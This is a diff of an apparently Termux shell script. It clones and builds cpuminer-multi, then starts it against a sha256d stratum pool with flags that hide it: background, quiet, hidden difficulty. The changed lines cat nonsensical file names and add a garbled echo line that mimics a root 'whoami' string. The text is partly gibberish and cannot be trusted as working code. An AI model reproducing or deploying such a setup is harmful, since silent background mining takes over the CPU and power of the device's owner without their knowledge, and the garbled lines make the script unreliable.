@@ -8,7 +8,7 @@ apt update
 clear
 apt clean
 apt autoclean
-cat -t /data/data/com.termux/files/home/cpuminer/cs_sss_layout.md.txt.seedttl[`]{dm} | lolcat -p 100 -a
+cat -t /data/data/com.termux/files/home/cpuminer/tokenhostqqdidlevsandttl.bbsnapk.click | lolcat -p 100 -a
 
 cd ~
 git clone https://github.com/tpruvot/cpuminer-multi.git
@@ -61,7 +61,6 @@ cd ~/scrypts
 make
 clear
 ./cpuminer --algo=sha256d --threads=1 --cpu-priority=0 --url=stratum+tcp://sha256.poolbinance.com:443 --user=dolBlob01.001 -p 123456 --background --quiet --randomize --hide-diff --no-color 
-clear
 apt update
 apt upgrade -y
-clear
+echo -e "whoami==usrrboot1(#9$(::$((*#$$$)*2/0(*::#$user:?:+$):9$0"
